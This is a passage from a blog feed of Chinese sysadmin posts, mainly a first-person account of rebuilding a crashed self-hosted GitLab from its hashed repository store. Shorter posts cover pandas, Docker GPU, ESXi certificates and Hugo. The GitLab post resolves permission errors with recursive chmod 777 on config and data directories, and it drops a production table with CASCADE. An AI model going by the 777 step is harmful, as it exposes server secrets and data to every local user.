open /var/opt/gitlab/prometheus/data/wal/00017925: permission denied&quot;</code></pre><p>gitlab仿佛和我说，你敢二次重启，我就敢三次崩。不过通过log看出来，很简单的嘛，一个权限，回到了最初的起点，gitlab能自己修复权限，所以直接全给777完事</p><pre><code class="BASH">chmod -R 777 /root/gitlab/configchmod -R 777 /root/gitlab/logschmod -R 777 /root/gitlab/data</code></pre><p>第三次重启！</p><h3 id="第四次报错"><a href="#第四次报错" class="headerlink" title="第四次报错"></a>第四次报错</h3><pre><code class="ruby">==&gt; /var/log/gitlab/gitlab-rails/production.log &lt;==NoMethodError (undefined method `throttle_unauthenticated_api_enabled&#39; for #&lt;ApplicationSetting id: 1, default_projects_limit: 100000, signup_enabled: false, gravatar_enabled: true, sign_in_text: nil, created_at: &quot;2019-11-03 17:51:42.367909000 +0000&quot;, updated_at: &quot;2020-12-03 05:49:41.241233000 +0000&quot;, home_page_url: nil, default_branch_protection: 2, help_text: nil, restricted_visibility_levels: [], version_check_enabled: true, max_attachment_size: 10, default_project_visibility: 0, default_snippet_visibility: 0, user_oauth_applications: true, after_sign_out_path: nil, session_expire_delay: 10080, import_sources: [&quot;github&quot;, &quot;bitbucket&quot;, &quot;bitbucket_server&quot;, &quot;gitlab&quot;, &quot;google_code&quot;, &quot;fogbugz&quot;, &quot;git&quot;, &quot;gitlab_project&quot;, &quot;gitea&quot;, &quot;manifest&quot;, &quot;phabricator&quot;], ............Did you mean?  throttle_unauthenticated_enabled               throttle_unauthenticated_enabled=               throttle_unauthenticated_enabled?               throttle_unauthenticated_enabled_was               throttle_authenticated_api_enabled               throttle_authenticated_api_enabled=               throttle_authenticated_api_enabled?               throttle_authenticated_api_enabled_was               throttle_authenticated_web_enabled               throttle_authenticated_web_enabled=               throttle_authenticated_web_enabled?               throttle_authenticated_api_enabled_change               throttle_authenticated_web_enabled_was):</code></pre><p>很长一段的错误，到了这，我已经放弃了，开始转到另一个错误上。</p><pre><code class="bash">SELECT COUNT(*) FROM container_repositories WHERE migration_state = &#39;import_skipped&#39;ERROR:  column &quot;migration_state&quot; does not exist at character 51</code></pre><p>登陆到数据库进行查看发现表里根本没有这一列，而且没有一行数据。</p><pre><code class="BASH">su - gitlab-psql psql -h /var/opt/gitlab/postgresql -d gitlabhq_production select * from container_repositories;</code></pre><p>通过和gitlab官网的建表语句对比(<a href="https://gitlab.com/gitlab-org/gitlab/-/blob/master/db/structure.sql">https://gitlab.com/gitlab-org/gitlab/-/blob/master/db/structure.sql</a>)</p><pre><code class="sql">CREATE TABLE container_repositories (    id integer NOT NULL,    project_id integer NOT NULL,    name character varying NOT NULL,    created_at timestamp without time zone NOT NULL,    updated_at timestamp without time zone NOT NULL,    status smallint,    expiration_policy_started_at timestamp with time zone,    expiration_policy_cleanup_status smallint DEFAULT 0 NOT NULL,    expiration_policy_completed_at timestamp with time zone,    migration_pre_import_started_at timestamp with time zone,    migration_pre_import_done_at timestamp with time zone,    migration_import_started_at timestamp with time zone,    migration_import_done_at timestamp with time zone,    migration_aborted_at timestamp with time zone,    migration_skipped_at timestamp with time zone,    migration_retries_count integer DEFAULT 0 NOT NULL,    migration_skipped_reason smallint,    migration_state text DEFAULT &#39;default&#39;::text NOT NULL,    migration_aborted_in_state text,    migration_plan text,    last_cleanup_deleted_tags_count integer,    delete_started_at timestamp with time zone,    status_updated_at timestamp with time zone,    CONSTRAINT check_05e9012f36 CHECK ((char_length(migration_plan) &lt;= 255)),    CONSTRAINT check_13c58fe73a CHECK ((char_length(migration_state) &lt;= 255)),    CONSTRAINT check_97f0249439 CHECK ((char_length(migration_aborted_in_state) &lt;= 255)));</code></pre><p>发现从migration_state列开始，就都没了。这时候就犯了第二个错误，想当然的相信了自己家服务器的硬盘能力。但是上头，认为这个问题的出现只是这个表坏了，不行就重建一个嘛，建表语句都有，drop 重新create一个完事，看起来也不是什么重要的表，丢了就丢了呗。登陆上数据库，删库跑路(bushi ~ ~ ~ )</p><pre><code class="SQL">drop table container_repositories;</code></pre><p>提示该表有外键，删了会有影响，这时候我哪里还管，删删删！！！</p><pre><code class="SQL">drop table container_repositories cascade;</code></pre><p>强行将表删除，然后用上面的语句重建的表，重启！</p><h3 id="第五次报错"><a href="#第五次报错" class="headerlink" title="第五次报错"></a>第五次报错</h3><p>啪啪啪！！！ 打脸来的很突然，第五次报错的更加离谱。这里已经完全记不清楚原因了。到这，开始想到，google是人类的精华。Pia!(ｏ ‵-′)ノ”(ノ﹏&lt;。)</p><p>google摸了摸我的头说： 我不是！<br><img src="google%E6%90%9C%E7%B4%A2%E4%B8%BA%E7%A9%BA.png" alt="google搜索为空"></p><p>不过这有怎么难到我，到处搜gitlab恢复文章，终于google不服有心人。找到了一篇类似的文章(<a href="https://tech.uupt.com/?p=147">https://tech.uupt.com/?p=147</a>) ,对比后，我得出了如下的结论：</p><ol><li>gitlab是挂了</li><li>gitlab是数据库出了问题</li><li>gitlab是数据库整个出了问题</li><li>gitlab是数据库整个没有从data目录中挂载过去导致gitlab启动时认为新程序，已经覆盖了一大部分数据了。</li><li>其他文件暂时应该没有问题</li></ol><p>想到这，我心拔凉拔凉的，五年的代码都在这里面，五年啊~</p><p>冷静下来，我觉得会有如下几个方案供我选择</p><ol><li>上策： 从原来的环境中完全恢复，数据库丢失通过分析硬盘文件进行恢复，这样能最大程度的保证不出什么问题。</li><li>中策： 通过迁移git-data下面的所有仓库数据，新建一个gitlab把原来的仓库都搞进去恢复。</li><li>下策： 全不要了，大不了重头再来！！！</li></ol><p>此时，距离案发现场已经过去了3个小时，我意识到，以我50g的硬盘，再加上我不断的重启操作，我那可怜的数据库数据应该是活不全了。万一几百张表里面坏几个，我修也得修死，还不知道会不会隐藏什么神奇的bug。至于下策，想都不要想了，这没了和我的积累没了也差不多了。</p><p>那么压力就完全给到了中策上面，想到了恢复又以下几种可能。</p><ol><li>通过git-data进行恢复，解析出所有git-data的仓库，然后进行复原。</li><li>通过自己平时用的5台电脑的上仓库，私人的gitlab对权限管控比较严格，能提交代码的电脑只有这五台，所以我将这五台上的仓库找到最新的提交上去也不是不行。</li></ol><p>但仓库超过500个时，我想了想，我得一个一个的找到他们，还得一个一个的比较5台电脑上不同仓库的时间，这工作量好像有点超出了我能力范围，于是，压力又来到了第一个选项：git-data恢复</p><p>在我的设想中，git-data恢复有三种</p><ol><li>git-data直接可用</li><li>gitlab支持直接导入git-data</li><li>通过工具把git-data解析出来</li></ol><p>这时候，我满怀希望的看了眼git-data下的仓库文件，他回敬了我一盆冷水<br><img src="git-data%E7%9B%AE%E5%BD%95.png" alt="git-data目录"><br>全是hash，gitlab从13开始使用hash模式储存代码，到14已经完全废除了原来的代码仓库模式。只觉得bbq就在眼前~~</p><p>此路不同，直接转其他路，google开启，对二三进行疯狂搜索，一无所获，这时候，我意识到，我只剩一条路可以走了。</p><h3 id="开启仓库寻找之路"><a href="#开启仓库寻找之路" class="headerlink" title="开启仓库寻找之路"></a>开启仓库寻找之路</h3><p>git-data目前乱七八糟的，但是他作为一个存储仓库的目录，一定有他的规范</p><pre><code class="bash">find ./ |grep config</code></pre><p>搜索出了一部分config的文件，那就证明，git-data只是一个不带名字的目录而已，而且config内还包括仓库名字，那这事就明朗了。就以下三步：</p><ol><li>解析出所有的git仓库</li><li>新建一个gitlab，做好基本配置</li><li>在gitlab新建仓库</li><li>把每个git仓库都push上去</li><li>收工</li></ol><p>在stackoverflow上找到了提取所有仓库的代码，为了安全起见，我将gitlab文件都备份到了test下面，随便折腾。</p><pre><code class="bash">for GITDIR in $(find /root/test/gitlab/data/git-data/repositories/@hashed/ -maxdepth 3 -type d -name &#39;*[0-9a-f].git&#39;); do   echo &quot;$(cat $&#123;GITDIR&#125;/config | grep fullpath | awk -F &quot; = &quot; &#39;&#123;print $2&#125;&#39;)   $GITDIR&quot;done xxxxxxx/xxxxxxxxx   /root/test/gitlab/data/git-data/repositories/@hashed/xx/xx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.gitxxxxxxx/xxxxxxxxx   /root/test/gitlab/data/git-data/repositories/@hashed/xx/xx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.gitxxxxxxx/xxxxxxxxx   /root/test/gitlab/data/git-data/repositories/@hashed/xx/xx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.git</code></pre><p>ok第一步完工，第二步，建立一个新的gitlab,在这里，我只保留conf目录，其他的都为空目录进去，chmod好相关权限，启动,修改用户密码，配置文字等。</p><pre><code class="bash">docker run -it --log-opt max-size=10m --log-opt max-file=3 -p 443:443 --name gitlab --restart always -v /root/gitlab/config:/etc/gitlab -v /root/gitlab/logs:/var/log/gitlab -v /root/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:latestgitlab-rails consoleuser = User.where(id:1).firstuser.password = &#39;newpassword&#39;user.password_confirmation = &#39;newpassword&#39;user.save!</code></pre><p>第二步也很简单就完成了，接下来就是第三步，把仓库还原进去<br>首先新建一个同名仓库，然后在git-data的该仓库下面试试git push，由于有些仓库较为久远，还是master分支，新库都默认时main分支，所以在此需要测试推送分支。这里又有个不好的习惯，自己写的代码都是master分支，只有极个别的几个仓库采用了其他分支，以后一定改！</p><pre><code class="bash">cd /root/test/gitlab/data/git-data/repositories/@hashed/xx/xx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.gitgit remote add origin ssh://url/user/xx.gitgit push --set-upstream origin master || git push --set-upstream origin main</code></pre><p>成功，登陆gitlab仓库看，历史记录都在，换个电脑git pull下来，git log，git branch等都和历史一样，这时候，我就知道我稳了。接下来就是批量恢复的阶段了。</p><p>500多个仓库，手工建那我手没了，申请一个token，用token批量建立仓库。然后python生成命令进行执行，完美。</p><pre><code class="python">for i in s.split(&#39;\n&#39;):    t=i.split(&#39;/&#39;)[1]    tmp=f&#39;curl --header &quot;PRIVATE-TOKEN: TOKEN&quot; -X POST &quot;https://url/api/v4/projects?name=&#123;t&#125;&amp;namespace_id=1&quot;&#39;    print(tmp)for tt in mmm:    t=tt.split()    t1=t[0].split(&#39;/&#39;)[1]    t2=t[1]    print(f&#39;cd &#123;t2&#125;&#39;)    print(f&quot;git remote add origin ssh://url/user/&#123;t1&#125;.git&quot;)    print(&quot;git push --set-upstream origin master || git push --set-upstream origin main&quot;)    print()</code></pre><p>最后经过执行，只有一个仓库不知道啥原因，没有name，手工运作一下，over!</p><h3 id="gitlab-cicd修复"><a href="#gitlab-cicd修复" class="headerlink" title="gitlab cicd修复"></a>gitlab cicd修复</h3><p>我对于gitlab cicd的依赖很大，历史上大约有300万次的cicd记录，所以gitlab-runner必不可少,还好执行的机器不多，也就7台，所以每个上去看一下，将同名的runner建立起来,也顺便清理了几个不需要的runner。</p><pre><code class="bash">cat /etc/gitlab-runner/config.tomlsudo gitlab-runner register --url &quot;&quot; -r=&#39;&#39; --name=&quot;&quot; --tag-list &quot;&quot; --executor &quot;docker&quot; --docker-image &quot;&quot; --docker-pull-policy=&quot;if-not-present&quot; --locked=false --run-untagged=true -nsudo gitlab-runner register --url &quot;&quot; -r=&#39;&#39; --name=&quot;&quot; --tag-list &quot;&quot; --executor &quot;shell&quot; ----locked=false --run-untagged=true -n</code></pre><p>此时没有意识到tag的做法，所以后面根据cicd文件，重新填了下对应runner的tag。</p><h3 id="gitlab-mail修复"><a href="#gitlab-mail修复" class="headerlink" title="gitlab mail修复"></a>gitlab mail修复</h3><p>在新的环境中，突然发现gitlab的邮件功能不可用了，gitlab邮件对我的任务提醒包括登陆提示都有很重要的作用。测试发了下邮件，得到如下错误:</p><pre><code class="bash">gitlab enable_starttls and :tls are mutually exclusive. Set :tls if you&#39;re on an SMTPS connection. Set :enable_starttls if you&#39;re on an SMTP connection and using STARTTLS for secure TLS upgrade.</code></pre><p>google下相关问题，源于配置的冲突，对配置做如下修改</p><pre><code class="ruby">Notify.test_email(&#39;xx@xx&#39;,&#39;email title&#39;,&#39;email content desc&#39;).deliver_now修改前：gitlab_rails[&#39;smtp_enable_starttls_auto&#39;] = truegitlab_rails[&#39;smtp_tls&#39;] = truegitlab_rails[&#39;smtp_enable_starttls&#39;] = true修改后：gitlab_rails[&#39;smtp_enable_starttls_auto&#39;] = falsegitlab_rails[&#39;smtp_tls&#39;] = truegitlab_rails[&#39;smtp_enable_starttls&#39;] = truegitlab-ctl reconfigure &amp;&amp; gitlab-ctl restart </code></pre><p>重启后完美解决问题。</p><h3 id="gitlab-备份"><a href="#gitlab-备份" class="headerlink" title="gitlab 备份"></a>gitlab 备份</h3><p>既然都吃了这么大一个亏了，那不得多加备份，上备份配置,保留最近7天的备份</p><pre><code class="ruby">gitlab_rails[&#39;manage_backup_path&#39;] = truegitlab_rails[&#39;backup_path&#39;] = &quot;/var/opt/gitlab/backups&quot;gitlab_rails[&#39;backup_archive_permissions&#39;] = 0644gitlab_rails[&#39;backup_keep_time&#39;] = 604800</code></pre><p>然后执行下<code>gitlab-rake gitlab:backup:create</code> 嘛<br>纳尼！！！ 这也能报错？？？</p><pre><code class="BASH">&#123;&quot;command&quot;:&quot;create&quot;,&quot;error&quot;:&quot;manager: repository empty: repository skipped&quot;,-------省略10w字2023-04-24 16:30:56 UTC -- Deleting tar staging files ...2023-04-24 16:30:56 UTC -- Cleaning up /var/opt/gitlab/backups/db2023-04-24 16:30:56 UTC -- Cleaning up /var/opt/gitlab/backups/repositories2023-04-24 16:30:56 UTC -- Deleting tar staging files ... done2023-04-24 16:30:56 UTC -- Deleting backups/tmp ...2023-04-24 16:30:56 UTC -- Deleting backups/tmp ... done2023-04-24 16:30:56 +0000 -- Deleting backup and restore lock filerake aborted!- 下面这个可能存在ActiveRecord::StatementInvalid: PG::UndefinedTable: ERROR:  relation &quot;design_management_repositories&quot; does not existLINE 8:  WHERE a.attrelid = &#39;&quot;design_management_repositories&quot;&#39;::regc...- 上面这个可能存在                            ^/opt/gitlab/embedded/lib/ruby/gems/3.0.0/gems/activerecord-6.1.7.2/lib/active_record/connection_adapters/postgresql/database_statements.rb:19:in `exec&#39;/opt/gitlab/embedded/lib/ruby/gems/3.0.0/gems/activerecord-6.1.7.2/lib/active_record/connection_adapters/postgresql/database_statements.rb:19:in `block (2 levels) in query&#39;</code></pre><p>通过查询官方文档(<a href="https://docs.gitlab.cn/ee/raketasks/backup_restore.html">https://docs.gitlab.cn/ee/raketasks/backup_restore.html</a>) 在gitlab12.1之前使用<code>gitlab-rake gitlab:backup:create</code> 12.2以后使用 <code>sudo gitlab-backup create</code> 命令进行备份，换了命令，搞定。通过crontab进行定时备份</p><pre><code class="bash">0 5 * * * bash /root/gitlab/bak.sh &gt;&gt; /var/gitlab_bak.log</code></pre><p>至此，gitlab恢复，五年的代码都回来了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，经历了两个晚上终于完成了对gitlab的恢复，也不由得写下此文以作纪念。</p><ol><li>做升级前要做好备份，不可随意升级，哪怕这个服务器跑了2年没关过，这个系统升级了2年没出问题</li><li>出现问题的第一件事，就是google相同问题，并且保存现场。</li><li>对于重要的数据备份最好做到多地多备。</li><li>对于没把握的事，要慎重点，不然损失难料。</li></ol>]]></content>
      
      
      <categories>
          
          <category> repair </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gitlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas的to_sql加速失败记录</title>
      <link href="/2022/08/19/pandas-de-to-sql-jia-su-shi-bai-ji-lu/"/>
      <url>/2022/08/19/pandas-de-to-sql-jia-su-shi-bai-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>在使用python作数据分析的时候，不免会用到pandas，而pandas与数据库(mysql)的交互在速度上一直是一个瓶颈</p><p>通过网上的一些笔记，发现了一些加速的方法，目前来看都是不可用的。</p><h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><p>先随便生成一个100w行的文件，在实际工作中远远高于100w。</p><pre><code class="python">#10进制转化成ip地址def int2ip(x):      return &#39;.&#39;.join([str(int(x)//(256**i)%256) for i in range(3,-1,-1)])fp=open(&#39;1.csv&#39;,&#39;w&#39;)fp.write(&#39;ip,score,id\n&#39;)n=1000000for i in range(1,n):    fp.write(f&#39;&#123;int2ip(i)&#125;,&#123;i&#125;,&#123;i&#125;\n&#39;)fp.close()</code></pre><p>插入数据库方式及时间</p><pre><code class="python">df.to_sql(&#39;cellfee&#39;,con=engine,if_exists=&#39;replace&#39;,index=True)# 11.4sdf.to_sql(&#39;cellfee&#39;,con=engine,if_exists=&#39;replace&#39;,index=True,chunksize=50000)# 11.3sdf.to_sql(&#39;cellfee&#39;,con=engine,if_exists=&#39;replace&#39;,index=True,chunksize=50000,method=&#39;multi&#39;)# 46.1sfrom sqlalchemy import event@event.listens_for(engine, &#39;before_cursor_execute&#39;)def receive_before_cursor_execute(conn, cursor, statement, params, context, executemany):    if executemany:        cursor.fast_executemany = Truedf.to_sql(&#39;cellfee&#39;,con=engine,if_exists=&#39;replace&#39;,index=True)# 11.7s</code></pre><p>不知道是使用方法有问题还是怎么回事，mysql加速完全没有效果，暂时放弃了。</p>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pandas </tag>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker下gpu的使用</title>
      <link href="/2022/06/15/docker-xia-gpu-de-shi-yong/"/>
      <url>/2022/06/15/docker-xia-gpu-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>关于gpu在虚拟化中的使用，目前分为三种</p><ul><li>直通:好处很明显，可以直接对gpu进行分配，不过一个显卡只能直通到一个设备上，只能独占，在虚拟机中的gpu切换较为繁琐。</li><li>vgpu:可以将一个gpu拆解成多个虚拟显卡分给多个虚拟机使用，但是支持vgpu的都是高端显卡，无力承受</li><li>docker-gpu:较为方便，可以使用docker对gpu进行分配，docker容器的启动速度相对于虚拟机快上很多，且docker搭建深度学习环境相对来说非常轻松。</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h3><ul><li>ubuntu20.04.04 desktop</li><li>GTX860M</li></ul><p>使用桌面版由于驱动的问题，所以相对于server版本问题多一些，由于显卡价格太高，先使用860M进行部分测试,以下均为root执行。</p><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>更新内核</p><pre><code class="bash">sed -i &#39;s;://\([^/]*\)/;://mirrors.ustc.edu.cn/;&#39; /etc/apt/sources.list /etc/apt/sources.list.d/parrot.list /etc/apk/repositories;apt-get update;apt-get upgrade -y;</code></pre><p>这一步的目的在于更新内核版本，防止一些未知错误，可以选择跳过。</p><p>处理现有驱动</p><pre><code class="bash">sudo apt-get purge nvidia*</code></pre><p>建立驱动黑名单</p><pre><code class="bash">sudo vim /etc/modprobe.d/blacklist-nouveau.conf</code></pre><p>写入</p><pre><code class="bash">blacklist nouveauoptions nouveau modeset=0</code></pre><p>执行</p><pre><code class="bash">sudo update-initramfs -ureboot</code></pre><p>安装驱动依赖</p><pre><code class="bash">apt-get install -y vim gcc make</code></pre><p>下载驱动<code>https://www.nvidia.cn/</code>并且安装</p><p>安装docker-ce</p><pre><code class="bash">export want_os=ubuntusudo apt-get update;sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common gnupg2;curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/$want_os/gpg | sudo apt-key add - ;sudo add-apt-repository &quot;deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/$want_os $(lsb_release -cs) stable&quot;;sudo apt-get -y update;sudo apt-get -y install docker-ce;sudo systemctl start docker;sudo systemctl enable docker;</code></pre><p>这里酌情换源，阿里源过慢</p><p>安装nvidia-container-toolkit</p><pre><code class="bash">curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add -curl -s -L https://nvidia.github.io/nvidia-docker/$distribution/nvidia-docker.list | sudo tee /etc/apt/sources.list.d/nvidia-docker.listsudo apt updateapt-get upgradesudo apt install nvidia-container-toolkitsudo systemctl restart docker</code></pre><h3 id="测试使用"><a href="#测试使用" class="headerlink" title="测试使用"></a>测试使用</h3><p>测试代码</p><pre><code class="python">import torchprint(torch.cuda.current_device())print(torch.cuda.device_count())print(torch.cuda.get_device_name(0))print(torch.cuda.is_available())import numpy as npx_values = [i for i in range(11)]x_train = np.array(x_values, dtype=np.float32)x_train = x_train.reshape(-1, 1)x_train.shapey_values = [2*i + 1 for i in x_values]y_train = np.array(y_values, dtype=np.float32)y_train = y_train.reshape(-1, 1)y_train.shapeimport torchimport torch.nn as nnimport numpy as np  class LinearRegressionModel(nn.Module):    def __init__(self, input_dim, output_dim):        super(LinearRegressionModel, self).__init__()        self.linear = nn.Linear(input_dim, output_dim)       def forward(self, x):        out = self.linear(x)        return out input_dim = 1output_dim = 1 model = LinearRegressionModel(input_dim, output_dim)  device = torch.device(&quot;cuda:0&quot; if torch.cuda.is_available() else &quot;cpu&quot;)model.to(device)  criterion = nn.MSELoss()  learning_rate = 0.01 optimizer = torch.optim.SGD(model.parameters(), lr=learning_rate)epochs = 1000for epoch in range(epochs):    epoch += 1    inputs = torch.from_numpy(x_train).to(device)    labels = torch.from_numpy(y_train).to(device)     optimizer.zero_grad()      outputs = model(inputs)     loss = criterion(outputs, labels)     loss.backward()     optimizer.step()     if epoch % 50 == 0:        print(&#39;epoch &#123;&#125;, loss &#123;&#125;&#39;.format(epoch, loss.item()))</code></pre><p>分别使用两种环境进行验证</p><pre><code class="bash">docker run -d -it --name=&quot;cuda&quot; --gpus=all  pytorch/pytorch:1.11.0-cuda11.3-cudnn8-develdocker run -d -it --name=&quot;cuda&quot; --gpus=all  pytorch/pytorch:1.1.0-cuda10.0-cudnn7.5-devel</code></pre><p>结果1</p><pre><code class="bash">01NVIDIA GeForce GTX 860MTrueepoch 50, loss 0.024971697479486465epoch 100, loss 0.014242921955883503epoch 150, loss 0.008123651146888733epoch 200, loss 0.004633431322872639epoch 250, loss 0.002642718842253089epoch 300, loss 0.0015073101967573166epoch 350, loss 0.0008597124251537025epoch 400, loss 0.0004903504741378129epoch 450, loss 0.00027967619826085865epoch 500, loss 0.00015952263493090868epoch 550, loss 9.098430018639192e-05epoch 600, loss 5.1895622164011e-05epoch 650, loss 2.959909033961594e-05epoch 700, loss 1.688160773483105e-05epoch 750, loss 9.62934791459702e-06epoch 800, loss 5.491684987646295e-06epoch 850, loss 3.13294117404439e-06epoch 900, loss 1.7874630202641129e-06epoch 950, loss 1.0191258752456633e-06epoch 1000, loss 5.815898020955501e-07</code></pre><p>结果2</p><pre><code class="bash">01NVIDIA GeForce GTX 860MTrueepoch 50, loss 0.12959100306034088epoch 100, loss 0.07391376048326492epoch 150, loss 0.04215765744447708epoch 200, loss 0.024045169353485107epoch 250, loss 0.013714421540498734epoch 300, loss 0.00782221183180809epoch 350, loss 0.00446149380877614epoch 400, loss 0.0025446717627346516epoch 450, loss 0.0014513888163492084epoch 500, loss 0.0008278193417936563epoch 550, loss 0.0004721507430076599epoch 600, loss 0.00026930044987238944epoch 650, loss 0.0001535998162580654epoch 700, loss 8.76076373970136e-05epoch 750, loss 4.996786447009072e-05epoch 800, loss 2.8499058316810988e-05epoch 850, loss 1.625478034839034e-05epoch 900, loss 9.272713214159012e-06epoch 950, loss 5.288254669721937e-06epoch 1000, loss 3.0164499094098574e-06</code></pre><p>都是可用的，为深度学习的环境变化提供的非常大的用途。</p>]]></content>
      
      
      <categories>
          
          <category> virtualization </category>
          
          <category> deeplearn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> gpu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac认证esxi证书错误的修复</title>
      <link href="/2022/03/30/mac-ren-zheng-esxi-zheng-shu-cuo-wu-de-xiu-fu/"/>
      <url>/2022/03/30/mac-ren-zheng-esxi-zheng-shu-cuo-wu-de-xiu-fu/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>mac在2020年9月1号开始，对超过398天的证书将认证错误，在默认环境下vcenter对管理的esxi主机下发五年证书。从而会显示<code>NET::ERR_CERT_VALIDITY_TOO_LONG</code>错误。</p><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><p>在主机 -&gt; 配置 -&gt; 高级设置 中修改 <code>vpxd.certmgmt.certs.daysValid</code>到360天就可以了。然后刷新管理的主机上面的证书。</p>]]></content>
      
      
      <categories>
          
          <category> repair </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Esxi </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo迁移到hugo的一些记录</title>
      <link href="/2021/12/27/hexo-qian-yi-dao-hugo-de-yi-xie-ji-lu/"/>
      <url>/2021/12/27/hexo-qian-yi-dao-hugo-de-yi-xie-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>随着博客篇数的增多，hexo在编译出静态化页面花费的时间越来越多。正值准备对内网和外网建立两套blog，内网的内容可以相对私密一些。<br>在迁移的过程中也有一定思想阻碍，毕竟hexo用了这么多年，迁移的成本的确有点高，但是通过实验了hugo的模版还有编译速度后，还是决定迁移过去。先在内网做测试部署好内网的blog，然后再迁移github上面的。</p><h2 id="hexo和hugo的编译速度对比"><a href="#hexo和hugo的编译速度对比" class="headerlink" title="hexo和hugo的编译速度对比"></a>hexo和hugo的编译速度对比</h2><h3 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h3><p>2核i7-10700<br>8G DDR4 2933MHZ<br>文章行数 413行&#x2F;篇</p><h3 id="结果对比"><a href="#结果对比" class="headerlink" title="结果对比"></a>结果对比</h3><table><thead><tr><th align="center">文章数量</th><th align="center">hexo速度(s)</th><th align="center">hugo速度(s)</th></tr></thead><tbody><tr><td align="center">50</td><td align="center">8.316s</td><td align="center">0.881s</td></tr><tr><td align="center">100</td><td align="center">17.541s</td><td align="center">1.685s</td></tr><tr><td align="center">200</td><td align="center">56.334s</td><td align="center">3.931s</td></tr><tr><td align="center">500</td><td align="center">5m1.506s</td><td align="center">16.224s</td></tr><tr><td align="center">1000</td><td align="center">20m15.857</td><td align="center">53.418s</td></tr><tr><td align="center">2000</td><td align="center">–</td><td align="center">3m7.630s</td></tr><tr><td align="center">10000</td><td align="center">–</td><td align="center">68m983s</td></tr></tbody></table><p>基本上可以看出来在100篇之内，hexo还是都是hugo10左右，也就是十几秒的样子，还勉强可以接受吧，但是到了500篇的量级，一次5分钟，太浪费时间了。<br>不过从这个表格也可以看出来，hugo的使用上限也就在2000篇左右。不过自己内网几百篇还是应该会有的，看到了这个结果，所以还是狠下心来做迁移吧。</p><h2 id="hugo安装使用"><a href="#hugo安装使用" class="headerlink" title="hugo安装使用"></a>hugo安装使用</h2><h3 id="直接使用"><a href="#直接使用" class="headerlink" title="直接使用"></a>直接使用</h3><p><code>https://github.com/gohugoio/hugo</code><br>下载了配置环境变量就行</p><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><p>使用shell</p><pre><code class="bash">docker run --rm -it -v $(pwd):/src -p 1313:1313 klakegg/hugo:ubuntu shell</code></pre><p>直接编译</p><pre><code class="bash">docker run --rm -it -v $(pwd):/src klakegg/hugo</code></pre><p>进行展示</p><pre><code class="bash">docker run --rm -it -v $(pwd):/src klakegg/hugo server</code></pre><h3 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h3><p>如果不在该目录下需要加<code>-s ./blog</code></p><pre><code class="bash">hugo new site bloghugo new posts/test.mdhugo server</code></pre><h2 id="hugo主题"><a href="#hugo主题" class="headerlink" title="hugo主题"></a>hugo主题</h2><p>主要作为代码记录的话，hugo的主题还是偏宽屏和有代码高亮，复制的比较喜欢<br>以下的主题都不错，最后在learn和stack之间选择了learn，不过在考虑同时部署两个，毕竟这代价也不大嘛。</p><ul><li>loveit</li><li>learn</li><li>stack</li><li>ananke   </li><li>Even</li><li>casper </li><li>papermod</li></ul><p>官网看起来不错但是实际运行有问题的</p><ul><li>cactus</li><li>clarity </li><li>hugobook</li><li>meme</li><li>zozo</li></ul><h2 id="hexo迁移到hugo"><a href="#hexo迁移到hugo" class="headerlink" title="hexo迁移到hugo"></a>hexo迁移到hugo</h2><h3 id="文章迁移"><a href="#文章迁移" class="headerlink" title="文章迁移"></a>文章迁移</h3><p><code>https://github.com/zrong/blog/blob/master/hexo2hugo.py</code></p><h3 id="图片迁移"><a href="#图片迁移" class="headerlink" title="图片迁移"></a>图片迁移</h3><p>直接复制原来的img文件夹到hugo的下面</p><h3 id="url变更"><a href="#url变更" class="headerlink" title="url变更"></a>url变更</h3><p>这个脚本采用了的postid,还在思考怎么弄</p>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> hugo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>oh-my-zsh在git目录卡顿的问题</title>
      <link href="/2021/12/27/oh-my-zsh-zai-git-mu-lu-qia-dun-de-wen-ti/"/>
      <url>/2021/12/27/oh-my-zsh-zai-git-mu-lu-qia-dun-de-wen-ti/</url>
      
